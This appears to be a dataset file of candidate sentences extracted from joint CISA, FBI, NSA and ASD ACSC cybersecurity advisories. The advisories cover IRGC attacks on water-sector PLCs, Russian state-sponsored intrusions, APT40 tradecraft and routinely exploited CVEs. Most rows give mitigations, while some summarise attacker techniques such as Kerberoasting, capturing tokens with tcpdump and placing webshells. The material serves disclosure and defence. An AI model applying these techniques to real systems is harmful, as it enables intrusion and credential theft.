CAND_01245,R025,12,R025_P0001,R025_S000152,"Validate Security Controls In addition to applying mitigations, the FBI, CISA, and MS-ISAC recommend exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory."
CAND_01246,R025,12,R025_P0001,R025_S000159,4.
CAND_01247,R025,13,R025_P0001,R025_S000163,TLP:CLEAR FBI | CISA | MS-ISAC Page 13 of 13 | Product ID: AA25-050A TLP:CLEAR 6.
CAND_01248,R025,13,R025_P0001,R025_S000164,"Tune your security program, including people, processes, and technologies, based on the data generated by this process."
CAND_01249,R025,13,R025_P0001,R025_S000170,"Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities."
CAND_01250,R025,13,R025_P0001,R025_S000175,"Version History February 19, 2025: Initial version."
CAND_01251,R026,1,R026_P0001,R026_S000005,SLTT organizations should report incidents to MS-ISAC (866-787- 4722 or SOC@cisecurity.org).
CAND_01252,R026,1,R026_P0001,R026_S000010,Disclosure is not limited.
CAND_01253,R026,1,R026_P0001,R026_S000014,TLP:CLEAR TLP:CLEAR Co-Authored by: Product ID: AA23-335A
CAND_01254,R026,1,R026_P0002,R026_S000023, Implement multifactor authentication.
CAND_01255,R026,1,R026_P0002,R026_S000025, Check PLCs for default or no passwords.
CAND_01256,R026,2,R026_P0001,R026_S000031,The IRGC is designated as a foreign terrorist organization by the United States and Canada.
CAND_01257,R026,2,R026_P0001,R026_S000038,"Complementing a previously published CISA Alert, the authoring agencies are releasing this updated joint advisory to share TTPs associated with IRGC cyber operations."
CAND_01258,R026,2,R026_P0001,R026_S000040,Overview of Updated Information This advisory provides observed TTPs the authoring agencies assess are likely associated with this IRGC- affiliated APT.
CAND_01259,R026,2,R026_P0001,R026_S000041,"The late 2023 campaign conducted by CyberAv3ngers compromised additional Unitronics version types, including older PLC models, than were previously outlined."
CAND_01260,R026,2,R026_P0001,R026_S000043,"Previously unreported TTPs also outline how the actors supplanted existing ladder logic files with their own, renamed devices likely to forestall owner access, reset software versions to older versions, disabled upload and download functions, and changed the default port numbers."
CAND_01261,R026,2,R026_P0001,R026_S000046,This targeting of PLCs poses an ongoing risk to UK organizations that utilize these components in their
CAND_01262,R026,3,R026_P0001,R026_S000047,TLP:CLEAR FBI |CISA | NSA | Et al.
CAND_01263,R026,3,R026_P0001,R026_S000050,"For a downloadable copy of the indicators of compromise (IOCs), see: Note: These IOCs are from the original joint advisory published Dec."
CAND_01264,R026,3,R026_P0001,R026_S000058,The observed activity includes the following:  Between Sept.
CAND_01265,R026,3,R026_P0001,R026_S000063,"22, 2023, IRGC cyber actors accessed multiple U.S.-based WWS facilities that operate HMI-capable Unitronics Vision Series PLCs likely by compromising internet accessible devices with default or no passwords."
CAND_01266,R026,4,R026_P0001,R026_S000074,"Since the programmed ladder logic is responsible for directing the functioning of the device, the replacement ladder logic file prevented the compromised devices from operating as intended."
CAND_01267,R026,4,R026_P0001,R026_S000082," The actors did not burn their ladder logic file to the device, preventing the retrieval of the ladder logic file from the device."
CAND_01268,R026,4,R026_P0001,R026_S000084,In at least one instance the actors displayed a text file with the same message on an older device that could not display a graphic image.
CAND_01269,R026,4,R026_P0001,R026_S000085,"Multiple versions of the Unitronics devices were compromised, including older models."
CAND_01270,R026,5,R026_P0001,R026_S000092,"18, 2024: The indicators provided in this advisory’s initial publication have been removed as they are outdated."
CAND_01271,R026,5,R026_P0001,R026_S000094,Water and Wastewater Systems Facilities (Original Version).
CAND_01272,R026,5,R026_P0001,R026_S000096,"For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool."
CAND_01273,R026,5,R026_P0001,R026_S000101,This could only be resolved when the engineering workstation’s software version changed to match the software version of the new ladder logic file or if the PLC device was factory reset so the ladder logic would be the latest software version.
CAND_01274,R026,5,R026_P0001,R026_S000103,The actors enabled password protections for the upload functions to prevent device operators from changing the programming remotely.
CAND_01275,R026,6,R026_P0001,R026_S000104,TLP:CLEAR FBI |CISA | NSA | Et al.
CAND_01276,R026,6,R026_P0001,R026_S000108,"Mitigations The authoring agencies recommend critical infrastructure organizations, including WWS Sector facilities, implement the following mitigation and detection strategies to improve organizational cybersecurity posture to defend against IRGC-affiliated activity."
CAND_01277,R026,6,R026_P0001,R026_S000111,"CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures."
CAND_01278,R026,6,R026_P0001,R026_S000113,"Note: The mitigations below are based on threat actor activity against Unitronics PLCs, but threat actors have targeted multiple internet-exposed PLCs in 2024.1 These mitigations should be applied to any internet-facing PLCs."
CAND_01279,R026,6,R026_P0002,R026_S000117,"1 Recent Cyber Attacks on US Infrastructure Underscore Vulnerability of Critical US Systems, November 2023–April 2024."
CAND_01280,R026,7,R026_P0001,R026_S000119,Page 7 of 11 | Product ID: AA23-335A TLP:CLEAR Immediate steps to prevent the attack:  (Updated Dec.
CAND_01281,R026,7,R026_P0001,R026_S000121,"o For more information, see Unitronics’ blog Unitronics Cybersecurity for Vision and Samba PLC Series and Release notes for VisiLogic 9.9.00."
CAND_01282,R026,7,R026_P0001,R026_S000126,Either disable the capability for remotely programming PLCs or require a strong password for remotely programming the PLC.
CAND_01283,R026,7,R026_P0001,R026_S000127,"Also change the default port, default PLC device name, and place behind a firewall that can detect attempted remote brute-forcing for the device password."
CAND_01284,R026,7,R026_P0001,R026_S000129," If remote access is required, implement a network proxy, gateway, firewall and/or virtual private network (VPN) in front of the PLC to control network access."
CAND_01285,R026,7,R026_P0001,R026_S000131,Implement security rules on these higher-level network security mechanisms that prevent the type of repeated and sustained login attempts that would be seen during a brute force attack.
CAND_01286,R026,7,R026_P0001,R026_S000139, Configure external and internal firewalls to block traffic using common ports associated with network protocols that are unnecessary for the particular network segment.
CAND_01287,R026,8,R026_P0001,R026_S000143," Disable any unused authentication methods, logic, or features, such as default authentication keys."
CAND_01288,R026,8,R026_P0001,R026_S000147, Ensure all field controllers require users to authenticate for all management sessions.
CAND_01289,R026,9,R026_P0001,R026_S000158,Page 9 of 11 | Product ID: AA23-335A TLP:CLEAR  Reduce risk exposure.
CAND_01290,R026,9,R026_P0001,R026_S000162, (Updated Dec.
CAND_01291,R026,9,R026_P0001,R026_S000165,"(End Update) Device Manufacturers Although critical infrastructure organizations using Unitronics (including rebranded Unitronics) PLC devices can take steps to mitigate the risks, it is ultimately the responsibility of the device manufacturer to build products that are secure by design and default."
CAND_01292,R026,9,R026_P0001,R026_S000174,"Validate Security Controls In addition to applying mitigations, the authoring agencies recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory."
CAND_01293,R026,9,R026_P0001,R026_S000176,To get started: 1.
CAND_01294,R026,9,R026_P0001,R026_S000182,4.
CAND_01295,R026,9,R026_P0001,R026_S000184,5.
CAND_01296,R026,10,R026_P0001,R026_S000189,"The authoring agencies recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory."
CAND_01297,R026,11,R026_P0001,R026_S000192,Page 11 of 11 | Product ID: AA23-335A TLP:CLEAR [12] M.
CAND_01298,R026,11,R026_P0001,R026_S000194,Heine.
CAND_01299,R026,11,R026_P0001,R026_S000200,Canadian organizations are encouraged to report incidents by emailing CCCS at contact@cyber.gc.ca.
CAND_01300,R026,11,R026_P0001,R026_S000203,Disclaimer The information in this report is being provided “as is” for informational purposes only.
CAND_01301,R027,1,R027_P0002,R027_S000008,"Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction."
CAND_01302,R027,1,R027_P0002,R027_S000017,Actions critical infrastructure organizations should implement to immediately strengthen their cyber posture.
CAND_01303,R027,1,R027_P0002,R027_S000018,• Patch all systems.
CAND_01304,R027,2,R027_P0003,R027_S000025,Be prepared.
CAND_01305,R027,2,R027_P0003,R027_S000027,"Create, maintain, and exercise a cyber incident response plan, resilience plan, and continuity of operations plan so that critical functions and operations can be kept running if technology systems are disrupted or need to be taken offline."
CAND_01306,R027,2,R027_P0003,R027_S000031,3.
CAND_01307,R027,2,R027_P0003,R027_S000037,See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.
CAND_01308,R027,2,R027_P0003,R027_S000038,"Historically, Russian state-sponsored advanced persistent threat (APT) actors have used common but effective tactics—including spearphishing, brute force, and exploiting known vulnerabilities against accounts and networks with weak security—to gain initial access to target networks."
CAND_01309,R027,3,R027_P0003,R027_S000050,These Russian state-sponsored APT actors conducted a multi-stage intrusion campaign in which they gained remote access to U.S.
CAND_01310,R027,3,R027_P0003,R027_S000051,"and international Energy Sector networks, deployed ICS-focused malware, and collected and exfiltrated enterprise and ICS-related data."
CAND_01311,R027,3,R027_P0003,R027_S000055,"In 2016, these actors conducted a cyber-intrusion campaign against a Ukrainian electrical transmission company and deployed CrashOverride malware specifically designed to attack power grids."
CAND_01312,R027,3,R027_P0003,R027_S000057,• Joint FBI-DHS-CISA CSA Russian Foreign Intelligence Service (SVR) Cyber Operations: Trends and Best Practices for Network Defenders • Joint NSA-FBI-CISA CSA Russian GRU Conducting Global Brute Force Campaign to Compromise Enterprise and Cloud Environments
CAND_01313,R027,4,R027_P0002,R027_S000058,CISA | FBI | NSA TLP:WHITE Page 4 of 12 | Product ID: AA22-011A
CAND_01314,R027,4,R027_P0003,R027_S000059,TLP:WHITE • Joint FBI-CISA CSA Russian State-Sponsored Advanced Persistent Threat Actor Compromises U.S.
CAND_01315,R027,4,R027_P0006,R027_S000067,"Russian state-sponsored APT actors have developed and deployed malware, including ICS-focused destructive malware."
CAND_01316,R027,4,R027_P0008,R027_S000069,Exploit Public Facing Applications [T1190]
CAND_01317,R027,4,R027_P0009,R027_S000072,Notable incidents include M.E.Doc accounting software and SolarWinds Orion.
CAND_01318,R027,4,R027_P0009,R027_S000073,Execution [TA0002]
CAND_01319,R027,5,R027_P0007,R027_S000082,Brute Force: Password Guessing [T1110.001] and Password Spraying [T1110.003]
CAND_01320,R027,5,R027_P0011,R027_S000087,Credentials from Password Stores [T1555] Russian state-sponsored APT actors have used previously compromised account credentials to attempt to access Group Managed Service Account (gMSA) passwords.
CAND_01321,R027,5,R027_P0011,R027_S000090,Command and Control [TA0011] Proxy: Multi-hop Proxy [T1090.003] Russian state-sponsored APT actors have used virtual private servers (VPSs) to route traffic to targets.
CAND_01322,R027,6,R027_P0002,R027_S000094,CISA | FBI | NSA TLP:WHITE Page 6 of 12 | Product ID: AA22-011A
CAND_01323,R027,6,R027_P0003,R027_S000096,"DETECTION Given Russian state-sponsored APT actors demonstrated capability to maintain persistent, long-term access in compromised enterprise and cloud environments, CISA, the FBI, and NSA encourage all critical infrastructure organizations to: ● Implement robust log collection and retention."
CAND_01324,R027,6,R027_P0003,R027_S000097,"Without a centralized log collection and monitoring capability, organizations have limited ability to investigate incidents or detect the threat actor behavior described in this advisory."
CAND_01325,R027,6,R027_P0003,R027_S000099,"o Third-party tools, such as Sparrow, Hawk, or CrowdStrike's Azure Reporting Tool (CRT), to review Microsoft cloud environments and to detect unusual activity, service principals, and application activity."
CAND_01326,R027,6,R027_P0003,R027_S000103,"o To detect password spray activity, review authentication logs for system and application login failures of valid accounts."
CAND_01327,R027,7,R027_P0003,R027_S000118,Immediately isolate affected systems.
CAND_01328,R027,7,R027_P0003,R027_S000120,Secure backups.
CAND_01329,R027,7,R027_P0003,R027_S000121,Ensure your backup data is offline and secure.
CAND_01330,R027,7,R027_P0003,R027_S000122,"If possible, scan your backup data with an antivirus program to ensure it is free of malware."
CAND_01331,R027,7,R027_P0003,R027_S000124,"Collect and review relevant logs, data, and artifacts."
CAND_01332,R027,7,R027_P0003,R027_S000128,Report incidents to CISA and/or the FBI via your local FBI field office or the FBI’s 24/7 CyWatch at (855) 292-3937 or CyWatch@fbi.gov.
CAND_01333,R027,8,R027_P0003,R027_S000136,"TLP:WHITE MITIGATIONS CISA, the FBI, and NSA encourage all organizations to implement the following recommendations to increase their cyber resilience against this threat."
CAND_01334,R027,8,R027_P0003,R027_S000146,Key questions: o Do personnel have the access they need?
CAND_01335,R027,8,R027_P0003,R027_S000149, Identify OT and IT network interdependencies and develop workarounds or manual controls to ensure ICS networks can be isolated if the connections create risk to the safe and reliable operation of OT processes.
CAND_01336,R027,8,R027_P0003,R027_S000153,o Implement data backup procedures on both the IT and OT networks.
CAND_01337,R027,9,R027_P0003,R027_S000157,"TLP:WHITE o In addition to backing up data, develop recovery documents that include configuration settings for common devices and critical OT equipment."
CAND_01338,R027,9,R027_P0003,R027_S000159,"Enhance your Organization’s Cyber Posture CISA, the FBI, and NSA recommend organizations apply the best practices below for identity and access management, protective controls and architecture, and vulnerability and configuration management."
CAND_01339,R027,9,R027_P0003,R027_S000161,• Require accounts to have strong passwords and do not allow passwords to be used across multiple accounts or stored on a system to which an adversary may have access.
CAND_01340,R027,9,R027_P0003,R027_S000167,o Implement Credential Guard for Windows 10 and Server 2016 (Refer to Microsoft: Manage Windows Defender Credential Guard for more information).
CAND_01341,R027,9,R027_P0003,R027_S000169,o Minimize the Active Directory attack surface to reduce malicious ticket-granting activity.
CAND_01342,R027,9,R027_P0003,R027_S000177,"o Create non-privileged accounts for privileged users and ensure they use the non- privileged accounts for all non-privileged access (e.g., web browsing, email access)."
CAND_01343,R027,10,R027_P0003,R027_S000182,TLP:WHITE useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.
CAND_01344,R027,10,R027_P0003,R027_S000183,• Enable strong spam filters.
CAND_01345,R027,10,R027_P0003,R027_S000185,o Filter emails containing executable files to prevent them from reaching end users.
CAND_01346,R027,10,R027_P0003,R027_S000186,o Implement a user training program to discourage users from visiting malicious websites or opening malicious attachments.
CAND_01347,R027,11,R027_P0003,R027_S000213,"Consider signing up for CISA notifications to receive timely information on current security issues, vulnerabilities, and high-impact activity."
CAND_01348,R027,11,R027_P0003,R027_S000222,"Contact +1-202-702-7843 on WhatsApp, Signal, or Telegram, or send information via the Rewards for Justice secure Tor-based tips line located on the Dark Web."
CAND_01349,R027,11,R027_P0003,R027_S000223,For more details refer to rewardsforjustice.net/malicious_cyber_activity.
CAND_01350,R027,12,R027_P0002,R027_S000224,CISA | FBI | NSA TLP:WHITE Page 12 of 12 | Product ID: AA22-011A
CAND_01351,R028,3,R028_P0001,R028_S000002,Table of contents Overview  5 Background  5 Activity summary  5 Notable tradecraft  6 Tooling  7 Case studies  7 Case study 1  8 Executive summary  8 Investigation findings  9 Details  9 Visual timeline  9 Detailed timeline 10 Actor tactics and techniques 11 Reconnaissance 11 Initial access 11 Execution 11 Persistence 11 Credential access 11 Lateral movement 11 Collection 11 Exfiltration 11 Case study 2 12 Executive summary 12 3
CAND_01352,R028,5,R028_P0002,R028_S000014,"The activity and techniques overlap with the groups tracked as Advanced Persistent Threat (APT) 40 (also known as Kryptonite Panda, GINGHAM TYPHOON, Leviathan and Bronze Mohawk in industry reporting)."
CAND_01353,R028,5,R028_P0002,R028_S000015,"This group has previously been reported as being based in Haikou, Hainan Province, PRC and receiving tasking from the PRC MSS, Hainan State Security Department.1 The following Advisory provides a sample of significant case studies of this adversary’s techniques in action against two victim networks."
CAND_01354,R028,5,R028_P0002,R028_S000018,"As such, the case studies are naturally older in nature, to ensure organisations were given the necessary time to remediate."
CAND_01355,R028,5,R028_P0002,R028_S000026,ASD's ACSC and the authoring agencies expect the group to continue using POCs for new high-profile vulnerabilities within hours or days of public release.
CAND_01356,R028,6,R028_P0001,R028_S000032,"However, as persistence occurs early in an intrusion, it is more likely to be observed in all intrusions – regardless of the extent of compromise or further actions taken."
CAND_01357,R028,6,R028_P0001,R028_S000034,"APT40 has embraced the global trend of using compromised devices, including small-office/home- office (SOHO) devices, as operational infrastructure and last-hop redirectors (T1584.008) for its operations in Australia."
CAND_01358,R028,8,R028_P0001,R028_S000052,This investigative report was provided to the organisation to summarise observed malicious activity and frame remediation recommendations.
CAND_01359,R028,8,R028_P0001,R028_S000057,"From July to August, key actor activity observed by the ASD’s ACSC included: • host enumeration, which enables an actor to build their own map of the network; • web shell use, giving the actor an initial foothold on the network and a capability to execute commands; and • deployment of other tooling leveraged by the actor for malicious purposes."
CAND_01360,R028,9,R028_P0001,R028_S000072,This was leveraged to enumerate both the network as well as all visible domains.
CAND_01361,R028,9,R028_P0001,R028_S000074,The actor carried out a Kerberoasting attack in order to obtain valid network credentials from a server (T1558.003).
CAND_01362,R028,9,R028_P0001,R028_S000075,The group were not observed gaining any additional points of presence in either the DMZ or the internal network.
CAND_01363,R028,10,R028_P0001,R028_S000078,Detailed timeline July: The actors established an initial connection to the front page of a custom web application (T1190) built for the organisation (hereafter referred to as the ‘web application’ or ‘webapp’) via a transport layer security (TLS) connection (T1102).
CAND_01364,R028,10,R028_P0001,R028_S000087,"July: The group continue to conduct host enumeration, looking for privilege escalation opportunities, and deploying a different web shell."
CAND_01365,R028,10,R028_P0004,R028_S000101,August: The actors perform significant network and Active Directory enumeration.
CAND_01366,R028,10,R028_P0004,R028_S000106,The group are not observed performing any additional activities until their access is blocked.
CAND_01367,R028,11,R028_P0001,R028_S000113,The actor was later able to use credentials they had compromised to further their access to the network.
CAND_01368,R028,12,R028_P0001,R028_S000116,The impacted organisation is hereafter referred to as ‘the organisation’.
CAND_01369,R028,13,R028_P0001,R028_S000145,"Access The host with the compromised appliance provided authentication via Active Directory and a webserver, for users connecting to VDI sessions (T1021.001)."
CAND_01370,R028,13,R028_P0001,R028_S000147,There was no evidence of compromise of any of these hosts.
CAND_01371,R028,13,R028_P0001,R028_S000153,"Using their access to the compromised appliance, the group collected genuine usernames, passwords (T1003), and MFA token values (T1111)."
CAND_01372,R028,14,R028_P0001,R028_S000157,"The actor also used access to the compromised appliance to scrape an SQL server (T1505.001), which resided in the organisation’s internal network."
CAND_01373,R028,14,R028_P0001,R028_S000163,The nature of the interactions could not be determined.
CAND_01374,R028,14,R028_P0001,R028_S000165,A log file was created or modified on HOST2.
CAND_01375,R028,14,R028_P0001,R028_S000174,JWTs were captured (T1528) and output to a file on HOST3.
CAND_01376,R028,14,R028_P0001,R028_S000181,May 2022 A known malicious IP address interacted with access gateway host HOST7 (TA0011).
CAND_01377,R028,14,R028_P0001,R028_S000188,May 2022 An additional log file was last modified (T1070).
CAND_01378,R028,15,R028_P0001,R028_S000201,"It is possible that multiple distinct actors deployed web shells, but that only a smaller number of actors conducted activity using these web shells."
CAND_01379,R028,15,R028_P0001,R028_S000205,Vulnerabilities believed to have been present on the compromised appliance would have allowed the actors to attain root privileges.
CAND_01380,R028,15,R028_P0001,R028_S000209,These were likely captured by modifying the genuine authentication process to output these values to a file.
CAND_01381,R028,15,R028_P0001,R028_S000210,There is no evidence of compromise of the ‘secret server’ which stores the unique values that provide for the security of MFA tokens.
CAND_01382,R028,15,R028_P0001,R028_S000211,T1040 Network Sniffing The actor is believed to have captured JWTs by capturing HTTP traffic on the compromised appliance.
CAND_01383,R028,15,R028_P0001,R028_S000212,"There is evidence that the utility tcpdump was executed on the compromised appliance, which may have been how the actor captured these JWTs."
CAND_01384,R028,17,R028_P0001,R028_S000225,"Below are recommendations for network security actions that should be taken to detect and prevent intrusions by APT40, followed by specific mitigations for four key TTPs summarised in Table 1."
CAND_01385,R028,17,R028_P0001,R028_S000227,"These locations can be convenient spots for writing data as they are usually world writable, that is, all user accounts registered in Windows have access to these directories and their subdirectories."
CAND_01386,R028,17,R028_P0001,R028_S000238,2.
CAND_01387,R028,18,R028_P0001,R028_S000249,Investigation: 1.
CAND_01388,R028,18,R028_P0001,R028_S000253,3.
CAND_01389,R028,19,R028_P0001,R028_S000265,If necessary attempt to collect a copy of the file for reverse engineering to determine whether it is legitimate.
CAND_01390,R028,19,R028_P0001,R028_S000266,References: https://www.elastic.co/guide/en/security/current/ process-execution-from-an-unusual-directory.html Author: ASD's ACSC Date: 2024/06/19 Status: experimental Tags: - tlp.green - classification.au.official - attack.execution Log source:  category: process_creation  product: windows APT40 Advisory – PRC MSS tradecraft in action 19
CAND_01391,R028,20,R028_P0001,R028_S000269,"ASD’s ACSC recommends reviewing and implementing their guidance on Windows Event Logging and Forwarding including the configuration files and scripts in the Windows Event Logging Repository and the Information Security Manual’s Guidelines for System Monitoring, to include centralizing logs and retaining logs for a suitable period."
CAND_01392,R028,20,R028_P0001,R028_S000274,"Organisations should ensure that security patches or mitigations are applied to internet facing infrastructure within 48 hours, and where possible, use the latest versions of software and operating systems."
CAND_01393,R028,20,R028_P0001,R028_S000277,Important servers such as Active Directory and other authentication servers should only be able to be administered from a limited number of intermediary servers or ‘jump servers’.
CAND_01394,R028,20,R028_P0001,R028_S000285,"MFA should be applied to all internet accessible remote access services, including: ▫ Web and cloud-based email ▫ Collaboration platforms ▫ Virtual private network connections ▫ Remote desktop services • Replace end-of-life equipment."
CAND_01395,R028,20,R028_P0001,R028_S000286,APT40 Advisory – PRC MSS tradecraft in action 20
CAND_01396,R028,21,R028_P0001,R028_S000293,Disclosure is not limited.
CAND_01397,R028,21,R028_P0001,R028_S000294,"Sources may use TLP:CLEAR when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release."
CAND_01398,R028,21,R028_P0001,R028_S000295,"Subject to standard copyright rules, TLP:CLEAR information may be distributed without restriction."
CAND_01399,R028,21,R028_P0001,R028_S000296,"For more information on the Traffic Light Protocol, see cisa.gov/tlp APT40 Advisory – PRC MSS tradecraft in action 21"
CAND_01400,R028,28,R028_P0001,R028_S000309,The details of the relevant licence conditions are available on the Creative Commons website as is the full legal code for the CC BY 4.0 licence (www.creativecommons.org/licenses).
CAND_01401,R029,1,R029_P0002,R029_S000001,"To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at CyWatch@fbi.gov."
CAND_01402,R029,1,R029_P0002,R029_S000007,"Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction."
CAND_01403,R029,1,R029_P0003,R029_S000010,Top Routinely Exploited Vulnerabilities SUMMARY This Joint Cybersecurity Advisory was coauthored by the U.S.
CAND_01404,R029,1,R029_P0003,R029_S000011,"Cybersecurity and Infrastructure Security Agency (CISA), the Australian Cyber Security Centre (ACSC), the United Kingdom’s National Cyber Security Centre (NCSC), and the U.S."
CAND_01405,R029,1,R029_P0003,R029_S000013,This advisory provides details on the top 30 vulnerabilities—primarily Common Vulnerabilities and Exposures (CVEs)—routinely exploited by malicious cyber actors in 2020 and those being widely exploited thus far in 20211.
CAND_01406,R029,3,R029_P0002,R029_S000040,"In addition to the 2020 CVEs listed above, organizations should prioritize patching for the following CVEs known to be exploited."
CAND_01407,R029,3,R029_P0002,R029_S000041,"• Microsoft Exchange: CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE- 2021-27065 o See CISA’s Alert: Mitigate Microsoft Exchange Server Vulnerabilities for more information on identifying and mitigating malicious activity concerning these vulnerabilities."
CAND_01408,R029,4,R029_P0002,R029_S000046,• VMware: CVE-2021-21985 o See CISA’s Current Activity: Unpatched VMware vCenter Software for more information and guidance.
CAND_01409,R029,4,R029_P0002,R029_S000047,"• Fortinet: CVE-2018-13379, CVE-2020-12812, and CVE-2019-5591 o See the CISA-FBI Joint Cybersecurity Advisory: APT Actors Exploit Vulnerabilities to Gain Initial Access for Future Attacks for more details and mitigations."
CAND_01410,R029,4,R029_P0002,R029_S000048,MITIGATIONS AND INDICATORS OF COMPROMISE One of the most effective best practices to mitigate many vulnerabilities is to update software versions once patches are available and as soon as is practicable.
CAND_01411,R029,4,R029_P0002,R029_S000055,"A concerted focus on patching this vulnerability could have a relative broad impact by forcing the actors to find alternatives, which may not have the same broad applicability to their target set."
CAND_01412,R029,5,R029_P0005,R029_S000068,"Patch Available Recommended Mitigations • Implement the appropriate refresh build according to the vulnerability details outlined by the vendor: Citrix: Mitigation Steps for CVE-2019-19781 • If possible, only allow the VPN to communicate with known Internet Protocol (IP) addresses (allow- list)."
CAND_01413,R029,6,R029_P0003,R029_S000079,An attacker can exploit this vulnerability to gain access to administrative credentials.
CAND_01414,R029,6,R029_P0005,R029_S000087,Fix
CAND_01415,R029,6,R029_P0006,R029_S000094,References • NIST NVD Vulnerability Detail: CVE-2019-11510 • CISA Alert: Continued Threat Actor Exploitation Post Pulse Secure VPN Patching • Pulse Security Advisory: SA44101 – 2019-04: Out-of-Cycle Advisory: Multiple vulnerabilities resolved in Pulse Connect Secure / Pulse Policy Secure 9.0RX • GitHub: cisagov / Check Your Pulse • CISA Analysis Report: Federal Agency Compromised by Malicious Cyber Actor • CISA Alert: Exploitation of Pulse Connect Secure Vulnerabilities
CAND_01416,R029,7,R029_P0002,R029_S000096,"Government Targets • NCSC Alert: Vulnerabilities Exploited in VPN Products Used Worldwide • DoJ Press Release: Seven International Cyber Defendants, Including “Apt41” Actors, Charged in Connection with Computer Intrusion Campaigns Against More Than 100 Victims Globally • FBI News: Russian Foreign Intelligence Service Exploiting Five Publicly Known Vulnerabilities to Compromise U.S."
CAND_01417,R029,7,R029_P0003,R029_S000098,"Table 4: CVE 2018-13379 Vulnerability Details Fortinet FortioOS Secure Socket Layer VPN (CVE 2018-13379) Vulnerability Description Fortinet Secure Sockets Layer (SSL) VPN is vulnerable to unauthenticated directory traversal, which allows attackers to gain access to the sslvpn_websession file."
CAND_01418,R029,7,R029_P0003,R029_S000100,CVSS 3.0
CAND_01419,R029,7,R029_P0004,R029_S000101,"Critical Vulnerability Discussion, IOCs, and Malware Campaigns Weakness in user access controls and web application directory structure allows attackers to read system files without authentication."
CAND_01420,R029,7,R029_P0005,R029_S000104,Multiple malware campaigns have taken advantage of this vulnerability.
CAND_01421,R029,7,R029_P0005,R029_S000106,Fix
CAND_01422,R029,7,R029_P0006,R029_S000108,• Monitor for alerts to any unscheduled tasks or unknown files/executables.
CAND_01423,R029,7,R029_P0006,R029_S000111,"Vulnerable Technologies and Versions Fortinet FortiOS 6.0.0 to 6.0.4, 5.6.3 to 5.6.7, and 5.4.6 to 5.4.12 are vulnerable."
CAND_01424,R029,8,R029_P0003,R029_S000119,The BIG-IP system in Appliance mode is also vulnerable.
CAND_01425,R029,8,R029_P0003,R029_S000122,"If it is not possible to update quickly, restrict access via the following actions."
CAND_01426,R029,8,R029_P0004,R029_S000130,"CVSS 3.0 Critical Vulnerability Discussion, IOCs, and Malware Campaigns CVE-2020-15505 is an RCE vulnerability in MobileIron Core & Connector versions 10.3 and earlier."
CAND_01427,R029,9,R029_P0003,R029_S000136,Recommended Mitigations • Download and install a fixed software version of the software from a vendor approved resource.
CAND_01428,R029,9,R029_P0003,R029_S000137,Detection Methods • None.
CAND_01429,R029,9,R029_P0003,R029_S000138,Manually check your software version to see if it is susceptible to this vulnerability.
CAND_01430,R029,9,R029_P0004,R029_S000143,An authenticated user with knowledge of the validation key and a mailbox may pass arbitrary objects for deserialization by the web application that runs as SYSTEM.
CAND_01431,R029,9,R029_P0006,R029_S000147,Patch Available Recommended Mitigations • Download and install a fixed software version of the software from a vendor approved resource.
CAND_01432,R029,10,R029_P0004,R029_S000159,Multiple malware campaigns have taken advantage of this vulnerability; the most notable being GandCrab ransomware.
CAND_01433,R029,11,R029_P0002,R029_S000169,Government publicly assessed last year was the most frequently targeted.
CAND_01434,R029,11,R029_P0002,R029_S000174,"Microsoft Equation Editor is an out-of- process COM server that is hosted by eqnedt32.exe, meaning it runs as its own process and can accept commands from other processes."
CAND_01435,R029,11,R029_P0003,R029_S000175,Data execution prevention (DEP) and address space layout randomization (ASLR) should protect against such attacks.
CAND_01436,R029,11,R029_P0003,R029_S000177,"Being an out-of-process COM server, protections specific to Microsoft Office such as EMET and Windows Defender Exploit Guard are not applicable to eqnedt32.exe, unless applied system-wide."
CAND_01437,R029,11,R029_P0005,R029_S000182,"Patch Available Recommended Mitigations • To remediate this issue, administrators should deploy Microsoft’s patch for this vulnerability: https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882."
CAND_01438,R029,11,R029_P0005,R029_S000183,• Those who cannot deploy the patch should consider disabling the Equation Editor as discussed in Microsoft Knowledge Base Article 4055535.
CAND_01439,R029,12,R029_P0003,R029_S000192,• Released Crowd and Crowd Data Center version 3.4.4 contains a fix for this issue and is available at https://www.atlassian.com/software/crowd/download.
CAND_01440,R029,12,R029_P0003,R029_S000193,"• Released Crowd and Crowd Data Center versions 3.0.5, 3.1.6, 3.2.8, and 3.3.5 contain a fix for this issue and are available at https://www.atlassian.com/software/crowd/download-archive."
CAND_01441,R029,13,R029_P0004,R029_S000213,Table 12: CVE 2019-18935 Vulnerability Details Telerik UI for ASP.NET AJAX Insecure Deserialization (CVE 2019-18935) Vulnerability Description Telerik User Interface (UI) for ASP.NET does not properly filter serialized input for malicious content.
CAND_01442,R029,14,R029_P0002,R029_S000233,References • Telerik UI for ASP.NET AJAX security advisory – Allows JavaScriptSerializer Deserialization • NIST NVD Vulnerability Detail: CVE-2019-18935 • ACSC Advisory 2020-004: Remote Code Execution Vulnerability Being Actively Exploited in Vulnerable Versions of Telerik UI by Sophisticated Actors • Bishop Fox – CVE-2019-18935: Remote Code Execution via Insecure Deserialization in Telerik UI • ACSC Advisory 2020-004: Remote Code Execution Vulnerability Being Actively Exploited in Vulnerable Versions of Telerik UI by Sophisticated Actors • FBI FLASH: Indicators Associated with Netwalker Ransomware
CAND_01443,R029,14,R029_P0003,R029_S000236,A webshell could be placed in any location served by the associated Internet Information Services (IIS) web server and did not require authentication.
CAND_01444,R029,14,R029_P0004,R029_S000238,C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\<version_number>\Template\Layouts
